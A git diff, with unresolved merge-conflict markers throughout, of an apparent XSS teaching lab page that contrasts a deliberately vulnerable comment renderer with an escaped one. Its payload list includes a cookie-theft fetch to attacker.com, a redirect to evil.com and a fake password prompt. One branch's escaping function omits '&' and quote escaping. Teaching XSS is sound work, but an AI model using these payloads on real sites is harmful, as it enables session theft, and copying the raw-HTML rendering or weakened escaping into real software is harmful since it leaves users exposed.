@@ -1,9 +1,14 @@
 'use client';
+<<<<<<< HEAD
 import { useState } from 'react';
+=======
+import { useState, useEffect, useRef } from 'react';
+>>>>>>> 952f1a1312c7c2bc2a6bb76427221fff9a98639a
 import LabShell from '@/components/LabShell';
 import styles from './page.module.css';
 
 const PAYLOADS = [
+<<<<<<< HEAD
   { label: 'Basic alert',      value: '<script>alert("XSS! Cookie: " + document.cookie)</script>' },
   { label: 'Img onerror',      value: '<img src=x onerror="alert(\'XSS via img tag!\')">' },
   { label: 'SVG onload',       value: '<svg onload=alert(document.domain)>' },
@@ -66,6 +71,62 @@ export default function XSSLab() {
   const selectPayload = (value: string) => {
     setInput(value);
     run(value);
+=======
+  { label: 'Basic alert',       value: '<script>alert("XSS! Cookie: " + document.cookie)</script>' },
+  { label: 'Img onerror',       value: '<img src=x onerror="alert(\'XSS via img tag!\')">' },
+  { label: 'SVG onload',        value: '<svg onload=alert(document.domain)>' },
+  { label: 'Cookie theft',      value: '<script>fetch("https://attacker.com?c="+document.cookie)</script>' },
+  { label: 'Session hijack',    value: '<script>document.body.innerHTML="<h1>Phished! Enter password:</h1><input>"</script>' },
+  { label: 'iFrame injection',  value: '<iframe src="javascript:alert(`XSS`)"></iframe>' },
+  { label: 'Redirect',          value: '<script>window.location="https://evil.com"</script>' },
+];
+
+interface Comment { id: number; author: string; body: string; html: string; }
+
+export default function XSSLab() {
+  const [input, setInput]           = useState('');
+  const [author, setAuthor]         = useState('hacker');
+  const [vulnComments, setVulnComments] = useState<Comment[]>([]);
+  const [safeComments, setSafeComments] = useState<Comment[]>([]);
+  const [loading, setLoading]       = useState(false);
+  const [lastSanitized, setLastSanitized] = useState('');
+  const [attackCount, setAttackCount]     = useState(0);
+  const [blockedCount, setBlockedCount]   = useState(0);
+  const vulnRef = useRef<HTMLDivElement>(null);
+  const safeRef = useRef<HTMLDivElement>(null);
+
+  useEffect(() => {
+    fetch('/api/xss-vulnerable').then(r => r.json()).then(d => setVulnComments(d.comments || []));
+    fetch('/api/xss-secure').then(r => r.json()).then(d => setSafeComments(d.comments || []));
+  }, []);
+
+  const run = async () => {
+    if (!input.trim()) return;
+    setLoading(true);
+    setAttackCount(c => c + 1);
+
+    const [vulnRes, safeRes] = await Promise.all([
+      fetch('/api/xss-vulnerable', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ comment: input, author }) }),
+      fetch('/api/xss-secure',    { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ comment: input, author }) }),
+    ]);
+    const vuln = await vulnRes.json();
+    const safe = await safeRes.json();
+
+    setVulnComments(vuln.comments || []);
+    setSafeComments(safe.comments || []);
+    if (safe.sanitized !== input) setBlockedCount(c => c + 1);
+    setLastSanitized(safe.sanitized || '');
+    setLoading(false);
+  };
+
+  const renderVuln = (html: string) => {
+    if (vulnRef.current) {
+      const el = document.createElement('div');
+      el.innerHTML = html;
+      return el.innerHTML;
+    }
+    return html;
+>>>>>>> 952f1a1312c7c2bc2a6bb76427221fff9a98639a
   };
 
   return (
@@ -76,7 +137,11 @@ export default function XSSLab() {
       severity="HIGH"
       description="XSS allows attackers to inject client-side scripts into web pages. When other users view the page, the malicious script executes in their browser context — giving the attacker access to cookies, session tokens, and the full DOM."
       references={[
+<<<<<<< HEAD
         { label: 'OWASP XSS',   href: 'https://owasp.org/www-community/attacks/xss/' },
+=======
+        { label: 'OWASP XSS', href: 'https://owasp.org/www-community/attacks/xss/' },
+>>>>>>> 952f1a1312c7c2bc2a6bb76427221fff9a98639a
         { label: 'PortSwigger', href: 'https://portswigger.net/web-security/cross-site-scripting' },
       ]}
     >
@@ -91,29 +156,45 @@ export default function XSSLab() {
           <span className={styles.statNum} style={{ color: 'var(--green)' }}>{blockedCount}</span>
           <span className={styles.statLabel}>Blocked by fix</span>
         </div>
+<<<<<<< HEAD
         {comments[0]?.sanitized && (
+=======
+        {lastSanitized && (
+>>>>>>> 952f1a1312c7c2bc2a6bb76427221fff9a98639a
           <>
             <div className={styles.statDiv} />
             <div className={styles.stat} style={{ flex: 1 }}>
               <span className={styles.statLabel}>Last sanitized output</span>
+<<<<<<< HEAD
               <code className={styles.sanitizedCode}>
                 {comments[0].sanitized || '(empty — all tags stripped)'}
               </code>
+=======
+              <code className={styles.sanitizedCode}>{lastSanitized || '(empty — all tags stripped)'}</code>
+>>>>>>> 952f1a1312c7c2bc2a6bb76427221fff9a98639a
             </div>
           </>
         )}
       </div>
 
+<<<<<<< HEAD
       {/* Payload picker — FIX: each button calls selectPayload which fires immediately */}
+=======
+      {/* Payload picker */}
+>>>>>>> 952f1a1312c7c2bc2a6bb76427221fff9a98639a
       <div className={styles.payloadBar}>
         <span className={styles.payloadLabel}>Quick payloads:</span>
         <div className={styles.payloadBtns}>
           {PAYLOADS.map(p => (
+<<<<<<< HEAD
             <button
               key={p.label}
               className={`btn btn-ghost ${styles.payloadBtn}`}
               onClick={() => selectPayload(p.value)}
             >
+=======
+            <button key={p.label} className={`btn btn-ghost ${styles.payloadBtn}`} onClick={() => setInput(p.value)}>
+>>>>>>> 952f1a1312c7c2bc2a6bb76427221fff9a98639a
               {p.label}
             </button>
           ))}
@@ -124,12 +205,16 @@ export default function XSSLab() {
       <div className={styles.inputRow}>
         <div className={styles.inputGroup}>
           <label className={styles.inputLabel}>Author</label>
+<<<<<<< HEAD
           <input
             type="text"
             value={author}
             onChange={e => setAuthor(e.target.value)}
             style={{ width: 140 }}
           />
+=======
+          <input type="text" value={author} onChange={e => setAuthor(e.target.value)} style={{ width: 140 }} />
+>>>>>>> 952f1a1312c7c2bc2a6bb76427221fff9a98639a
         </div>
         <div className={styles.inputGroup} style={{ flex: 1 }}>
           <label className={styles.inputLabel}>Comment / payload</label>
@@ -138,11 +223,19 @@ export default function XSSLab() {
             value={input}
             onChange={e => setInput(e.target.value)}
             onKeyDown={e => e.key === 'Enter' && run()}
+<<<<<<< HEAD
             placeholder="Type a comment or choose a payload above…"
           />
         </div>
         <button className="btn btn-red" onClick={() => run()} disabled={loading || !input.trim()}>
           {loading ? 'Posting…' : 'Post comment →'}
+=======
+            placeholder="Type a comment or choose a payload above..."
+          />
+        </div>
+        <button className="btn btn-red" onClick={run} disabled={loading || !input.trim()}>
+          {loading ? 'Posting...' : 'Post comment →'}
+>>>>>>> 952f1a1312c7c2bc2a6bb76427221fff9a98639a
         </button>
       </div>
 
@@ -161,6 +254,7 @@ export default function XSSLab() {
           <div className={styles.panelCode}>
             <div className={styles.codeLabel}>app/api/xss-vulnerable/route.ts</div>
             <pre className={styles.code}>{`// ❌ VULNERABLE
+<<<<<<< HEAD
 // Returns raw HTML — browser executes it
 html: \`<div>\${comment}</div>\`
 // Scripts and event handlers EXECUTE`}</pre>
@@ -177,6 +271,21 @@ html: \`<div>\${comment}</div>\`
                   className={styles.commentItem}
                   dangerouslySetInnerHTML={{ __html: c.vulnHtml }}
                 />
+=======
+const query = \`INSERT INTO comments ... '\${comment}'\`;
+// Then rendered as:
+html: \`<div>\${c.body}</div>\`
+// Scripts and event handlers EXECUTE`}</pre>
+          </div>
+
+          <div className={styles.outputArea} ref={vulnRef}>
+            <div className={styles.outputLabel}>Live output — scripts execute here:</div>
+            {vulnComments.length === 0 ? (
+              <p className={styles.emptyState}>No comments yet. Post one above.</p>
+            ) : (
+              vulnComments.map(c => (
+                <div key={c.id} className={styles.commentItem} dangerouslySetInnerHTML={{ __html: c.html }} />
+>>>>>>> 952f1a1312c7c2bc2a6bb76427221fff9a98639a
               ))
             )}
           </div>
@@ -197,15 +306,22 @@ html: \`<div>\${comment}</div>\`
             <pre className={styles.code}>{`// ✅ SECURE
 function escapeHtml(str: string) {
   return str
+<<<<<<< HEAD
     .replace(/&/g,  '&amp;')
     .replace(/</g,  '&lt;')
     .replace(/>/g,  '&gt;')
     .replace(/"/g,  '&quot;')
     .replace(/'/g,  '&#039;');
+=======
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
+>>>>>>> 952f1a1312c7c2bc2a6bb76427221fff9a98639a
 }
 // Tags become plain text, never executed`}</pre>
           </div>
 
+<<<<<<< HEAD
           <div className={styles.outputArea}>
             <div className={styles.outputLabel}>Safe output — tags rendered as text:</div>
             {comments.length === 0 ? (
@@ -217,6 +333,15 @@ function escapeHtml(str: string) {
                   className={styles.commentItemSafe}
                   dangerouslySetInnerHTML={{ __html: c.safeHtml }}
                 />
+=======
+          <div className={styles.outputArea} ref={safeRef}>
+            <div className={styles.outputLabel}>Safe output — tags rendered as text:</div>
+            {safeComments.length === 0 ? (
+              <p className={styles.emptyState}>No comments yet.</p>
+            ) : (
+              safeComments.map(c => (
+                <div key={c.id} className={styles.commentItemSafe} dangerouslySetInnerHTML={{ __html: c.html }} />
+>>>>>>> 952f1a1312c7c2bc2a6bb76427221fff9a98639a
               ))
             )}
           </div>
